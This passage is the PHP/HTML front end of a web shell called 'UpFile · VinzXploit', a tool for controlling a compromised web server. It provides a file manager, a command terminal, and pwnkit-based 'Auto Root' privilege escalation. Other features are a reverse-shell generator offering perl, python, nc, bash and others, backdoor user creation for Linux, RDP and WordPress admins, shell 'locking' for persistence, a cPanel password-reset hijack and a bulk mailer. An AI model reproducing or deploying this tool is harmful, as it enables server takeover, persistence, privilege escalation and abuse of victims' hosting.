    box-shadow: 0 0 40px rgba(0,255,65,0.15), 0 0 0 1px rgba(0,255,65,0.1);
    animation: modalIn 0.18s ease-out;
}
.modal .box.wide { max-width: 95%; }
@keyframes modalIn {
    from { opacity: 0; transform: translateY(-8px) scale(0.98); }
    to { opacity: 1; transform: translateY(0) scale(1); }
}
.modal h3 {
    font-family: var(--display);
    color: var(--green);
    margin: 0 0 18px;
    font-size: 16px;
    letter-spacing: 1px;
    padding-bottom: 12px;
    border-bottom: 1px solid var(--line-hi);
    display: flex; align-items: center; gap: 10px;
}
.close-m {
    float: right;
    cursor: pointer;
    color: var(--red);
    font-size: 22px;
    line-height: 1;
    padding: 2px 8px;
    border-radius: 4px;
    transition: all 0.15s;
    user-select: none;
}
.close-m:hover { background: var(--red); color: var(--bg-0); text-shadow: none; }
.form-group { margin-bottom: 14px; }
.form-group label {
    display: block;
    margin-bottom: 6px;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 1px;
    text-transform: uppercase;
}
.form-group input, .form-group select, .form-group textarea {
    width: 100%;
}
.form-actions {
    display: flex; gap: 10px; justify-content: flex-end;
    margin-top: 20px;
    padding-top: 16px;
    border-top: 1px solid var(--line);
}
.term-out {
    width: 100%;
    min-height: 300px;
    background: #000;
    color: var(--green);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius);
    padding: 12px;
    font-family: var(--mono);
    font-size: 12px;
    line-height: 1.55;
    resize: vertical;
    margin-bottom: 12px;
}
.CodeMirror {
    height: 70vh;
    border: 1px solid var(--line-hi);
    border-radius: var(--radius);
    font-family: var(--mono) !important;
    font-size: 13px;
}

/* ============ UTIL ============ */
.text-danger { color: var(--red); }
.text-ok { color: var(--green); }
.text-warn { color: var(--amber); }
.text-dim { color: var(--text-dim); }
pre {
    background: var(--bg-0);
    border: 1px solid var(--line-hi);
    border-radius: var(--radius);
    padding: 12px;
    overflow: auto;
    font-size: 12px;
    color: var(--text);
    margin: 8px 0;
}
footer {
    text-align: center;
    padding: 30px 20px;
    font-size: 12px;
    color: var(--text-dim);
    letter-spacing: 1px;
}
footer .heart { color: var(--green); }

/* ============ RESPONSIVE ============ */
@media (max-width: 860px) {
    .fm-row {
        grid-template-columns: 28px minmax(0, 1fr) auto;
        grid-template-areas:
            "check name actions"
            ".     meta meta";
        row-gap: 6px;
        padding: 12px 14px;
    }
    .fm-row.head { display: none; }
    .fm-row .fm-check { grid-area: check; }
    .fm-row .fm-name { grid-area: name; }
    .fm-row .fm-size { grid-area: meta; text-align: left; }
    .fm-row .fm-perm { grid-area: meta; text-align: left; justify-self: center; }
    .fm-row .fm-actions { grid-area: actions; }
    .fm-row .fm-size::before { content: "Size: "; color: var(--text-dim); }
    .fm-row .fm-perm::before { content: " · "; }
    .app { padding: 12px; }
    .app-header { padding: 10px 14px; }
    .brand-text h1 { font-size: 16px; }
    .toolbar a { font-size: 11px; padding: 7px 10px; }
    .info-card { grid-template-columns: 1fr 1fr; }
    .modal .box { margin: 20px auto; padding: 18px; }
}
@media (max-width: 480px) {
    .info-card { grid-template-columns: 1fr; }
    .header-actions { width: 100%; }
    .brand-text h1 { font-size: 15px; }
    .bulk-bar select { flex: 1 1 100%; }
    .bulk-bar .spacer { display: none; }
    .bulk-bar input[type=submit] { flex: 1 1 auto; }
}
</style>
</head>
<body>

<header class="app-header">
    <div class="brand">
        <div class="brand-mark">V</div>
        <div class="brand-text">
            <h1>UpFile · VinzXploit</h1>
            <small>Web Shell · Access Granted</small>
        </div>
    </div>
    <div class="header-actions">
        <span class="tag"><span class="dot"></span>Live</span>
        <span class="tag"><i class="fa fa-code"></i> PHP <?=PHP_VERSION?></span>
    </div>
</header>

<main class="app">

    <!-- INFO CARD -->
    <section class="info-card">
        <div class="info-item">
            <i class="fa fa-user"></i>
            <div>
                <span class="label">Remote</span>
                <span class="value"><?=htmlspecialchars($_SERVER['REMOTE_ADDR'])?></span>
            </div>
        </div>
        <div class="info-item">
            <i class="fa fa-desktop"></i>
            <div>
                <span class="label">Host</span>
                <span class="value"><?=htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST']))?> / <?=htmlspecialchars($_SERVER['SERVER_NAME'])?></span>
            </div>
        </div>
        <div class="info-item">
            <i class="fa fa-hdd-o"></i>
            <div>
                <span class="label">System</span>
                <span class="value"><?=htmlspecialchars(php_uname())?></span>
            </div>
        </div>
        <div class="info-item">
            <i class="fa fa-globe"></i>
            <div>
                <span class="label">Domains</span>
                <span class="value"><?=count_domains()?></span>
            </div>
        </div>
        <div class="info-item">
            <i class="fa fa-id-badge"></i>
            <div>
                <span class="label">User</span>
                <span class="value"><?=htmlspecialchars(get_current_user())?></span>
            </div>
        </div>
        <div class="info-item">
            <i class="fa fa-terminal"></i>
            <div>
                <span class="label">Kernel</span>
                <span class="value"><?=htmlspecialchars(suggest_exploit())?></span>
            </div>
        </div>
    </section>

    <!-- TOOLBAR -->
    <nav class="toolbar">
        <a href="?path=<?=hx($path)?>&terminal=normal"><i class="fa fa-terminal"></i> Terminal</a>
        <a href="?path=<?=hx($path)?>&terminal=root"><i class="fa fa-user-lock"></i> Auto Root</a>
        <a href="?path=<?=hx($path)?>&adminer"><i class="fa fa-database"></i> Adminer</a>
        <a href="?path=<?=hx($path)?>&destroy"><i class="fa fa-ghost"></i> Backdoor Kill</a>
        <a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?=suggest_exploit()?>" target="_blank"><i class="fa fa-flask"></i> Exploit DB</a>
        <a href="?path=<?=hx($path)?>&lockshell"><i class="fa fa-lock"></i> Lock Shell</a>
        <a href="#" onclick="$('#modal-lockfile').addClass('active');return false;"><i class="fa fa-file-o"></i> Lock File</a>
        <a href="#" onclick="$('#modal-adduser').addClass('active');return false;"><i class="fa fa-user-plus"></i> Add User</a>
        <a href="#" onclick="$('#modal-rdp').addClass('active');return false;"><i class="fa fa-laptop"></i> Create RDP</a>
        <a href="?path=<?=hx($path)?>&mailer"><i class="fa fa-envelope"></i> Mailer</a>
        <a href="?path=<?=hx($path)?>&backconnect"><i class="fa fa-user-secret"></i> Backconnect</a>
        <a href="?path=<?=hx($path)?>&unlockshell"><i class="fa fa-unlock"></i> Unlock</a>
        <a href="//hashes.com/en/tools/hash_identifier" target="_blank"><i class="fa fa-hashtag"></i> Hash ID</a>
        <a href="?path=<?=hx($path)?>&cpanelreset"><i class="fa fa-server"></i> cPanel Reset</a>
        <a href="?path=<?=hx($path)?>&createwp"><i class="fa fa-wordpress"></i> WP User</a>
        <a href="//github.com/VinzSecurity1337/" target="_blank"><i class="fa fa-github"></i> README</a>
    </nav>

    <!-- BREADCRUMB -->
    <div class="breadcrumb">
        <?php
        $parts = explode('/', $path);
        foreach ($parts as $id => $pat) {
            if ($pat === '' && $id === 0) {
                echo '<a href="?path=' . hx('/') . '"><i class="fa fa-folder-o"></i> /</a><span class="sep">›</span>';
                continue;
            }
            if ($pat === '') continue;
            $build = '';
            for ($i = 0; $i <= $id; $i++) {
                $build .= $parts[$i];
                if ($i != $id) $build .= "/";
            }
            echo '<a href="?path=' . hx($build) . '">' . htmlspecialchars($pat) . '</a><span class="sep">›</span>';
        }
        if (stristr(PHP_OS, "WIN")) windowsDriver();
        echo '<a class="bc-home" href="?path=' . hx(__DIR__) . '"><i class="fa fa-home"></i> HOME</a>';
        ?>
    </div>

    <!-- UPLOAD -->
    <section class="section">
        <div class="section-head">
            <div class="section-title"><i class="fa fa-cloud-upload"></i> Upload</div>
        </div>
        <div class="section-body">
            <form method="POST" enctype="multipart/form-data" action="?path=<?=hx($path)?>" class="upload-bar">
                <input type="file" name="gecko-upload" required>
                <input type="submit" name="upload-submit" value="UPLOAD" class="btn-primary">
            </form>
        </div>
    </section>

    <!-- FILE MANAGER -->
    <section class="section">
        <div class="section-head">
            <div class="section-title"><i class="fa fa-folder-open"></i> File Manager</div>
            <div style="display:flex;gap:6px;flex-wrap:wrap">
                <a href="#" class="btn" onclick="$('#modal-mkdir').addClass('active');return false;"><i class="fa fa-folder"></i> + Folder</a>
                <a href="#" class="btn" onclick="$('#modal-touch').addClass('active');return false;"><i class="fa fa-file"></i> + File</a>
            </div>
        </div>

        <form method="POST" action="?path=<?=hx($path)?>">
            <div class="fm-list">
                <div class="fm-row head">
                    <div></div>
                    <div>Name</div>
                    <div class="fm-size">Size</div>
                    <div class="fm-perm">Perm</div>
                    <div class="fm-actions">Actions</div>
                </div>

                <?php
                $scandir = @scandir($path);
                if ($scandir) {
                    foreach ($scandir as $dir) {
                        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
                        $fulldir = $path . '/' . $dir;
                        $w = is_writable($fulldir); $r = is_readable($fulldir);
                        $permClass = $w ? 'perm-w' : (!$r ? 'perm-r' : 'perm-n');
                        echo "<div class='fm-row'>";
                        echo   "<div><input type='checkbox' name='check[]' value='" . htmlspecialchars($dir) . "' class='fm-check'></div>";
                        echo   "<div class='fm-name'><i class='fa fa-folder-o file-ic' style='color:var(--amber)'></i> <a href='?path=" . hx($fulldir) . "'>" . htmlspecialchars(namaPanjang($dir)) . "</a></div>";
                        echo   "<div class='fm-size'>[DIR]</div>";
                        echo   "<div class='fm-perm'><span class='perm-tag $permClass'>" . perms($fulldir) . "</span></div>";
                        echo   "<div class='fm-actions'>";
                        echo     "<a href='#' class='icon-btn' title='Rename' onclick=\"renameItem('" . addslashes(htmlspecialchars($fulldir)) . "','" . addslashes(htmlspecialchars($dir)) . "');return false;\"><i class='fa fa-pencil'></i></a>";
                        echo     "<a href='#' class='icon-btn' title='Chmod' onclick=\"chmodItem('" . addslashes(htmlspecialchars($fulldir)) . "');return false;\"><i class='fa fa-shield'></i></a>";
                        echo   "</div>";
                        echo "</div>";
                    }
                    foreach ($scandir as $file) {
                        if (!is_file("$path/$file")) continue;
                        $fullfile = $path . '/' . $file;
                        $size = @filesize($fullfile);
                        $w = is_writable($fullfile); $r = is_readable($fullfile);
                        $permClass = $w ? 'perm-w' : (!$r ? 'perm-r' : 'perm-n');
                        echo "<div class='fm-row'>";
                        echo   "<div><input type='checkbox' name='check[]' value='" . htmlspecialchars($file) . "' class='fm-check'></div>";
                        echo   "<div class='fm-name'>" . file_ext($fullfile) . " <a href='?path=" . hx($path) . "&f=" . htmlspecialchars(urlencode($file)) . "'>" . htmlspecialchars(namaPanjang($file)) . "</a></div>";
                        echo   "<div class='fm-size'>" . formatSize($size) . "</div>";
                        echo   "<div class='fm-perm'><span class='perm-tag $permClass'>" . perms($fullfile) . "</span></div>";
                        echo   "<div class='fm-actions'>";
                        echo     "<a href='#' class='icon-btn' title='Rename' onclick=\"renameItem('" . addslashes(htmlspecialchars($fullfile)) . "','" . addslashes(htmlspecialchars($file)) . "');return false;\"><i class='fa fa-pencil'></i></a>";
                        echo     "<a href='#' class='icon-btn' title='Chmod' onclick=\"chmodItem('" . addslashes(htmlspecialchars($fullfile)) . "');return false;\"><i class='fa fa-shield'></i></a>";
                        echo     "<a href='?path=" . hx($path) . "&don=" . htmlspecialchars(urlencode($fullfile)) . "' class='icon-btn' title='Download'><i class='fa fa-download'></i></a>";
                        echo   "</div>";
                        echo "</div>";
                    }
                }
                ?>
            </div>

            <div class="bulk-bar">
                <select name="gecko-select">
                    <option value="delete">Delete</option>
                    <option value="unzip">Unzip</option>
                    <option value="zip">Zip</option>
                </select>
                <input type="submit" name="submit-action" value="Apply" class="btn-primary">
                <div class="spacer"></div>
                <span class="text-dim" style="font-size:11px">
                    <i class="fa fa-info-circle"></i> Select items via checkbox
                </span>
            </div>
        </form>
    </section>

</main>

<!-- ============================ MODALS ============================ -->

<div class="modal" id="modal-mkdir"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-folder"></i> Create Folder</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>Folder Name</label>
            <input type="text" name="name" placeholder="newfolder" required autofocus>
        </div>
        <input type="hidden" name="opt" value="mkdir">
        <input type="hidden" name="submit" value="1">
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" value="Create" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-touch"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-file"></i> Create File</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>File Name</label>
            <input type="text" name="name" placeholder="shell.php" required autofocus>
        </div>
        <input type="hidden" name="opt" value="touch">
        <input type="hidden" name="submit" value="1">
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" value="Create" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-rename"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-pencil"></i> Rename</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>New Name</label>
            <input type="text" name="newname" id="rename-input" required autofocus>
        </div>
        <input type="hidden" name="path" id="rename-path">
        <input type="hidden" name="opt" value="rename">
        <input type="hidden" name="submit" value="1">
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" value="Rename" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-chmod"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-shield"></i> Change Permission</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>Permission (octal)</label>
            <input type="text" name="perm" id="chmod-input" value="0755" required>
        </div>
        <input type="hidden" name="path" id="chmod-path">
        <input type="hidden" name="opt" value="chmod">
        <input type="hidden" name="submit" value="1">
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" value="Apply" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-lockfile"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-lock"></i> Lock File (Persistence)</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>Target File</label>
            <input type="text" name="lockfile" placeholder="shell.php" required>
        </div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" value="Lock" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-adduser"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-user-plus"></i> Create Linux User (root via pwnkit)</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>Username</label>
            <input type="text" name="add-username" required>
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="add-password" required>
        </div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submit-adduser" value="Create" class="btn-primary">
        </div>
    </form>
</div></div>

<div class="modal" id="modal-rdp"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-laptop"></i> Create RDP User (Windows)</h3>
    <form method="POST" action="?path=<?=hx($path)?>">
        <div class="form-group">
            <label>Username</label>
            <input type="text" name="add-rdp" required>
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="add-rdp-pass" required>
        </div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submit-rdp" value="Create" class="btn-primary">
        </div>
    </form>
</div></div>

<?php if (isset($_GET['cpanelreset'])): ?>
<div class="modal active"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-server"></i> cPanel Password Reset Hijack</h3>
    <form method="POST" action="?path=<?=hx($path)?>&cpanelreset">
        <div class="form-group">
            <label>Email to receive reset link</label>
            <input type="email" name="resetcp" placeholder="you@mail.com" required>
        </div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submit-cp" value="Reset" class="btn-primary">
        </div>
    </form>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['createwp'])): ?>
<div class="modal active"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-wordpress"></i> Create WordPress Admin</h3>
    <form method="POST" action="?path=<?=hx($path)?>&createwp">
        <div class="form-group"><label>DB Name</label><input type="text" name="db_name" required></div>
        <div class="form-group"><label>DB User</label><input type="text" name="db_user" required></div>
        <div class="form-group"><label>DB Password</label><input type="password" name="db_pass" required></div>
        <div class="form-group"><label>DB Host</label><input type="text" name="db_host" value="127.0.0.1" required></div>
        <div class="form-group"><label>WP Username</label><input type="text" name="wp_user" required></div>
        <div class="form-group"><label>WP Password</label><input type="password" name="wp_pass" required></div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submitwp" value="Create Admin" class="btn-primary">
        </div>
    </form>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['mailer'])): ?>
<div class="modal active"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-envelope"></i> PHP Mailer</h3>
    <form method="POST" action="?path=<?=hx($path)?>&mailer">
        <div class="form-group"><label>From</label><input type="email" name="mail-from-smtp" required></div>
        <div class="form-group"><label>To</label><input type="email" name="mail-to-smtp" required></div>
        <div class="form-group"><label>Subject</label><input type="text" name="mailto-subject" required></div>
        <div class="form-group"><label>Message</label><textarea name="message-smtp" rows="6"></textarea></div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submit-mail" value="Send" class="btn-primary">
        </div>
    </form>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['backconnect'])): ?>
<div class="modal active"><div class="box">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-user-secret"></i> Reverse Shell Generator</h3>
    <form method="POST" action="?path=<?=hx($path)?>&backconnect">
        <div class="form-group">
            <label>Payload</label>
            <select name="gecko-bc">
                <option value="perl">Perl</option>
                <option value="python">Python</option>
                <option value="ruby">Ruby</option>
                <option value="bash">Bash</option>
                <option value="php">PHP</option>
                <option value="nc">nc</option>
                <option value="sh">sh</option>
                <option value="xterm">Xterm</option>
                <option value="golang">Golang</option>
            </select>
        </div>
        <div class="form-group"><label>Host</label><input type="text" name="backconnect-host" placeholder="127.0.0.1" required></div>
        <div class="form-group"><label>Port</label><input type="number" name="backconnect-port" placeholder="1337" required></div>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Cancel</button>
            <input type="submit" name="submit-bc" value="Execute" class="btn-primary">
        </div>
    </form>
    <?php if (!empty($bc_out)): ?>
        <h4 style="color:var(--green);margin:20px 0 8px">Output</h4>
        <textarea class="term-out" readonly><?=$bc_out?></textarea>
    <?php endif; ?>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['terminal']) && $_GET['terminal'] == "normal"): ?>
<div class="modal active"><div class="box wide">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-terminal"></i> Terminal — <?=htmlspecialchars(get_current_user())?>@<?=htmlspecialchars($_SERVER['SERVER_ADDR'])?></h3>
    <?php if (!empty($term_out)): ?>
        <textarea class="term-out" readonly><?=$term_out?></textarea>
    <?php endif; ?>
    <form method="POST" action="?path=<?=hx($path)?>&terminal=normal" style="display:flex;gap:8px">
        <input type="text" name="terminal-text" placeholder="$ command" autofocus style="flex:1">
        <input type="submit" name="terminal" value="›" class="btn-primary" style="width:60px">
    </form>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['terminal']) && $_GET['terminal'] == "root"): ?>
<div class="modal active"><div class="box wide">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-user-lock"></i> Auto Root — pwnkit</h3>
    <?php
    $madRoot = $path . '/.mad-root';
    if (file_exists($madRoot)) {
        $response = @file_get_contents($madRoot);
        $r_text = explode(" ", trim($response));
        if (isset($r_text[0]) && $r_text[0] == "uid=0(root)") {
            echo "<p class='text-ok'><b>✓ ROOT OBTAINED</b></p>";
            if (!empty($root_out)) echo "<textarea class='term-out' readonly>" . $root_out . "</textarea>";
        } else {
            echo "<p class='text-danger'>✗ Not vulnerable.</p>";
            echo "<pre>" . htmlspecialchars(cmd('cat /etc/os-release')) . "</pre>";
            echo "<p class='text-dim'>Kernel: <span class='text-warn'>" . htmlspecialchars(suggest_exploit()) . "</span></p>";
        }
    } else {
        echo "<p class='text-dim'>Fetching pwnkit... <a href='?path=" . hx($path) . "&terminal=root'>Reload</a></p>";
    }
    ?>
    <form method="POST" action="?path=<?=hx($path)?>&terminal=root" style="display:flex;gap:8px;margin-top:12px">
        <input type="text" name="root-terminal" placeholder="# root command" style="flex:1">
        <input type="submit" name="submit-root" value="›" class="btn-primary" style="width:60px">
    </form>
</div></div>
<?php endif; ?>

<?php if (isset($_GET['f'])): ?>
<?php
$edit_file = $path . "/" . $_GET['f'];
$edit_content = is_readable($edit_file) ? htmlspecialchars(file_get_contents($edit_file)) : '';
?>
<div class="modal active"><div class="box wide">
    <span class="close-m" onclick="$('.modal').removeClass('active')">&times;</span>
    <h3><i class="fa fa-code"></i> Editor · <?=htmlspecialchars($_GET['f'])?></h3>
    <form method="POST" action="?path=<?=hx($path)?>&f=<?=htmlspecialchars(urlencode($_GET['f']))?>">
        <textarea name="code-editor" id="code"><?=$edit_content?></textarea>
        <div class="form-actions">
            <button type="button" class="btn" onclick="$('.modal').removeClass('active')">Close</button>
            <input type="submit" name="save-editor" value="Save" class="btn-primary">
        </div>
    </form>
</div></div>
<script>
window.addEventListener('load', function() {
    CodeMirror.fromTextArea(document.getElementById('code'), {
        mode: "xml", lineNumbers: true, theme: "ayu-mirage"
    });
});
</script>
<?php endif; ?>

<script>
function renameItem(p, n) {
    $('#rename-path').val(p);
    $('#rename-input').val(n);
    $('#modal-rename').addClass('active');
}
function chmodItem(p) {
    $('#chmod-path').val(p);
    $('#modal-chmod').addClass('active');
}
$(document).on('keydown', function(e) {
    if (e.key === 'Escape') $('.modal').removeClass('active');
});
$('.modal').on('click', function(e) {
    if (e.target === this) $(this).removeClass('active');
});
<?php if (isset($_GET['response'])): ?>
$(document).ready(function(){
    var r = '<?=htmlspecialchars($_GET['response'])?>';
    Swal.fire({
        icon: r === 'success' ? 'success' : 'error',
        title: r === 'success' ? 'Success' : 'Failed',
        background: '#0a140a',
        color: '#00ff41',
        confirmButtonColor: '#00ff41',
        confirmButtonText: 'OK'
    });
});
<?php endif; ?>
</script>

<footer>
    <span class="heart">▸</span> UpFile · VinzXploit · <?=date('Y')?> <span class="heart">◂</span>
</footer>

</body>
</html>